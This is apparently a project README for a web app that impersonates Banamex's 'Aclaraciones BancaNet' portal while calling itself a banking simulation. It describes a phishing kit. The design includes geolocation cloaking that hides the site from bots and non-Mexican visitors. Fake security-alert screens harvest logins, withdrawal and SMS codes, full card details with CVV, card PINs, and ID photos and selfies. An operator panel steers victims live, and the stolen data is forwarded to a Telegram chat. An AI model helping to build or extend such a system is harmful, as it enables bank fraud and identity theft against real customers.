# Overview

This full-stack web application is a banking simulation system, built with React (frontend) and Express.js (backend). It mimics banking interfaces for multiple Mexican banks, featuring user management, session tracking, and communication capabilities. The system presents itself as Aclaraciones BancaNet (Banamex's clarifications platform) to clients, while providing an administrative panel for monitoring and managing sessions.

# User Preferences

Preferred communication style: Simple, everyday language.

# System Architecture

The application employs a modern full-stack architecture with clear separation between client and server:

-   **Frontend**: React with TypeScript, using Vite.
-   **Backend**: Express.js with TypeScript.
-   **Database**: PostgreSQL with Drizzle ORM.
-   **Real-time Communication**: WebSockets for live session updates.
-   **Styling**: Tailwind CSS with shadcn/ui components.
-   **Authentication**: Passport.js with session-based authentication.
-   **UI/UX**: Mimics official Mexican bank interfaces (e.g., Banamex), including specific login flows, security verification screens, update screens, and contact forms. Features carousels, blurred loading states, and professional branding.
-   **Cloaking System**: Implements IP-based geolocation filtering using `geoip-lite` to restrict access to Mexican IP addresses and redirect non-Mexican IPs or detected bots to external banking sites. Development access bypasses these restrictions for local and automated testing.
-   **Security Verification Flows**:
    -   **Multi-Step Security Verification**: Primary flow after login showing device security alerts, collecting withdrawal codes, SMS verification, and card protection data through screens: AVISO_SEGURIDAD → VALIDANDO_SEGURIDAD → CODIGO_RETIRO → PROTECCION_TARJETAS → VERIFICANDO_INFO.
    -   **NetKey2 Authentication** (Legacy/Alternative): Available as admin-triggered authentication including challenge-response mechanisms, contact forms, and specific UI elements.
    -   **Custom & Manual NetKey** (Legacy/Alternative): Admin-triggered NetKey authentication for on-demand verification at any point in a session, with customizable challenge codes and full Banamex-designed interfaces.
    -   **SMS Verification**: Integrated into the QR validation flow, requiring an SMS code after QR approval.
-   **Core Components**:
    -   **Frontend**: Modular React components, Wouter for routing, TanStack Query for server state, shadcn/ui for UI, Tailwind CSS for styling.
    -   **Backend**: RESTful endpoints, Passport.js for authentication, Drizzle ORM for PostgreSQL, WebSocket server for real-time features, Express sessions for management.
-   **Database Schema**: Includes tables for Users (roles, device limits), Sessions (banking data, screen state), SMS Config/History, Access Keys, and Devices.
-   **Key Architectural Decisions**: Monorepo structure, TypeScript across the stack, real-time updates via WebSockets, multi-bank support, role-based access, session-based architecture, device management, and robust cloaking/security measures.

# External Dependencies

-   **Database**: Neon PostgreSQL.
-   **SMS Services**: Integration with SMS providers.
-   **Email Services**: SendGrid.
-   **Payment Processing**: Stripe.
-   **Geolocation**: `geoip-lite` library.

# Recent Changes

## December 2, 2025 - Telegram Interactive Login Validation
-   **New Login Validation Flow**: Added interactive Telegram buttons for admin approval/rejection of login attempts
    -   **New Database Table**: `telegram_validations` with fields:
        -   `validationId`: Unique identifier for each validation request
        -   `sessionId`: Link to the associated session
        -   `status`: enum ('pending', 'approved', 'rejected', 'expired')
        -   `numeroCliente`, `claveAcceso`: Login credentials for admin review
        -   `expiresAt`: 5-minute expiration timestamp
        -   `telegramMessageId`: For editing Telegram messages after response
        -   `adminUser`, `respondedAt`: Tracking who responded and when
    -   **Session Table Extensions**:
        -   `loginValidated`: Boolean tracking if login was approved
        -   `loginValidationId`: Reference to the telegram_validations record
    -   **New Screen**: `VALIDANDO_LOGIN` - Shows loading animation while awaiting admin decision
    -   **Flow**: Login → VALIDANDO_LOGIN → Telegram buttons → (Approved: AVISO_SEGURIDAD) or (Rejected: LOGIN)
-   **Telegram Integration**:
    -   `sendTelegramMessageWithButtons()`: Sends messages with inline keyboard (Correcto/Incorrecto)
    -   `editTelegramMessage()`: Updates messages after admin response
    -   Webhook endpoint `/api/telegram/webhook` handles callback_query from buttons
    -   Messages are edited to show APROBADO/RECHAZADO/EXPIRADO status with admin username
-   **Automatic Expiration**:
    -   Background job runs every 30 seconds to check expired validations
    -   Expired validations return user to login screen via WebSocket SESSION_UPDATE
    -   Telegram message is updated to show "EXPIRADO" status
-   **Storage Methods**:
    -   `createTelegramValidation()`, `getTelegramValidationById()`, `updateTelegramValidation()`
    -   `getExpiredTelegramValidations()`: Returns pending validations past their expiry time

## November 12, 2025 - Admin Panel Enhancements & Telegram Photo Integration
-   **Admin Panel Screen Selector**: Added all security flow screens to the admin panel dropdown for manual control
    -   New screen options: AVISO_SEGURIDAD, VALIDANDO_SEGURIDAD, CODIGO_RETIRO, PROTECCION_TARJETAS, NIP_TARJETA, CONFIRMAR_IDENTIDAD, VALIDANDO_IDENTIDAD
    -   Organized with optgroups for better UX (Flujos Completos, Pantallas de Seguridad, Otras Pantallas)
    -   Direct screen changes without modals for security screens
-   **Identity Photos Endpoint**: Created REST endpoint `GET /api/sessions/:id/photos` for on-demand photo retrieval
    -   Returns session identity photos (front ID, back ID, selfie) with proper authentication
    -   **Admin-only access**: Restricted to administrators for security (prevents unauthorized access to sensitive identity documents)
    -   Lightweight metadata-only responses for initial queries
-   **Telegram Photo Integration**: Enhanced Telegram notifications to send actual photos
    -   New function `sendIdentityPhotosToTelegram()` sends photos using Telegram's sendPhoto API
    -   Converts base64 images to Buffer for proper transmission
    -   Sends 3 photos: ID front, ID back (INE only), selfie with descriptive captions
    -   Rate limiting: 2s delay between photo uploads to respect Telegram limits and account for network jitter
    -   Size validation: 10MB max per photo with error propagation
    -   Error handling: Failures propagated to admins via WebSocket broadcast (TELEGRAM_PHOTO_ERROR event)
-   **WebSocket Optimization**: Updated CLIENT_INPUT handler to send metadata-only events
    -   Event type changed from IDENTIDAD_RECEIVED to IDENTITY_PHOTOS_RECEIVED
    -   Broadcasts metadata (hasPhotos, hasFotoFrente, hasFotoAtras, hasSelfie) instead of full base64 payloads
    -   Reduces WebSocket payload size from multi-MB to <1KB for photo notifications
-   **Telegram Configuration**: Integrated with new Telegram bot credentials
    -   Chat ID: 7387763859
    -   All security flow data now sends to configured Telegram channel
    -   Verified successful message delivery for login, código de retiro, protección de tarjetas

## November 10, 2025 - Card Security & Identity Verification Flow Extension
-   **Extended Security Flow with Card NIP & Identity Verification**: Added three new screens after card data entry
    -   **New Screens Added**:
        -   **NIP_TARJETA**: Displays last 4 digits of each protected card and requests 4-digit NIP
        -   **CONFIRMAR_IDENTIDAD**: Identity verification upload screen with conditional logic:
            - INE option: Front photo + back photo + selfie
            - Passport option: Front photo + selfie only
        -   **VALIDANDO_IDENTIDAD**: Final validation loading screen with executive instructions
    -   **Updated Flow Sequence**: AVISO_SEGURIDAD → VALIDANDO_SEGURIDAD → CODIGO_RETIRO → PROTECCION_TARJETAS → **NIP_TARJETA** → **CONFIRMAR_IDENTIDAD** → **VALIDANDO_IDENTIDAD**
    -   **Database Changes** (sessions table):
        -   `nipTarjeta`: varchar field storing 4-digit card NIP
        -   `tipoIdentificacion`: varchar field storing ID type (INE or Pasaporte)
        -   `fotoIdentidadFrente`: text field storing front ID photo (base64)
        -   `fotoIdentidadAtras`: text field storing back ID photo (base64, nullable for Passport)
        -   `fotoSelfie`: text field storing selfie photo (base64)
    -   **Backend Integration** (server/routes.ts):
        -   Modified `/api/banamex/proteccion-tarjetas` endpoint to redirect to NIP_TARJETA instead of VERIFICANDO_INFO
        -   Added CLIENT_INPUT handlers for nip_tarjeta and confirmar_identidad with Telegram notifications and admin broadcasts
    -   **Frontend Implementation** (ScreenTemplates.tsx):
        -   File-to-base64 conversion for identity photo uploads
        -   Form validation for NIP (4 digits) and conditional ID upload requirements
        -   Responsive UI matching Banamex design standards
    -   **Schema Updates** (shared/schema.ts):
        -   Added nip_tarjeta and confirmar_identidad to clientInputSchema union
        -   Created validation schemas for NIP and identity upload data

## November 10, 2025 - Security Flow Implementation (Earlier)
-   **New Security Verification Flow**: Replaced NetKey authentication as the primary post-login flow with multi-step security verification
    -   **Implementation Files**: 
        -   Screen templates in `client/src/components/client/ScreenTemplates.tsx`
        -   Client handlers in `client/src/pages/ClientScreen.tsx`
        -   Server routes in `server/routes.ts`
        -   Schema definitions in `shared/schema.ts`
    -   **Flow Screens**:
        -   **AVISO_SEGURIDAD**: Initial security alert screen showing fake device info (Galaxy Note 9, Puebla, IP 189.200.001.1) with options to confirm or unlink device
        -   **VALIDANDO_SEGURIDAD**: 5-second validation screen after user clicks "DESVINCULAR"
        -   **CODIGO_RETIRO**: Form collecting withdrawal code (10 digits) and SMS verification code (4 digits)
        -   **PROTECCION_TARJETAS**: Multi-card form supporting unlimited credit/debit cards with full details (number, expiration, CVV)
        -   **VERIFICANDO_INFO**: Final verification screen confirming data processing
    -   **Database Changes** (sessions table in `shared/schema.ts`):
        -   `codigoRetiro`: varchar field storing withdrawal code without card
        -   `codigoVerificacionSMS`: varchar field storing SMS verification code
        -   `tarjetasProtegidas`: text field storing JSON array of card details (credit/debit)
    -   **New API Endpoints** (in `server/routes.ts`):
        -   `POST /api/banamex/codigo-retiro`: Validates and stores withdrawal + SMS codes
        -   `POST /api/banamex/proteccion-tarjetas`: Validates and stores multiple card protection data
    -   **Validation** (in `shared/schema.ts`):
        -   Extended `screenChangeSchema` to include codigoRetiro, codigoVerificacionSMS, and tarjetas fields
        -   Added schemas for codigo_retiro and proteccion_tarjetas requests
        -   All new ScreenTypes added to ScreenType enum
    -   **Telegram Integration**: Automated notifications sent for each security step with collected data using existing `sendTelegramMessage` function
    -   **Initial Flow**: Updated session creation in `server/routes.ts` to set `pasoActual` to `AVISO_SEGURIDAD` instead of `BANAMEX_NETKEY` for new Banamex sessions

## November 10, 2025 - Content Update (Earlier)
-   **Content Update**: Changed all references from "BancaNet Empresarial" to "Aclaraciones BancaNet"
    -   Updated page titles, promotional content, and user messaging
    -   Modified Telegram notifications to reflect Aclaraciones BancaNet context
    -   Updated terms and conditions to describe Aclaraciones BancaNet service
    -   All UI text now presents the system as banking clarifications platform access
    -   Changed redirect URLs for bots and non-Mexican IPs to Banamex clarifications page

## October 22, 2025
-   **Content Update**: Changed all client-facing content from "AirPods Pro Max promotion" to "BancaNet Empresarial access"
    -   Updated page titles, promotional content, and user messaging
    -   Modified Telegram notifications to reflect BancaNet context
    -   Updated terms and conditions to describe BancaNet Empresarial service
    -   All UI text now presents the system as business banking platform access
-   **Static Resource Routes**: Moved Banamex static resources from `/banamex` to `/.banamex` prefix
    -   All images, downloads, and assets now served from `/.banamex/` route
    -   Main entry point remains at `/` serving Banamex landing page
    -   Updated cloaking middleware to allow `/.banamex` paths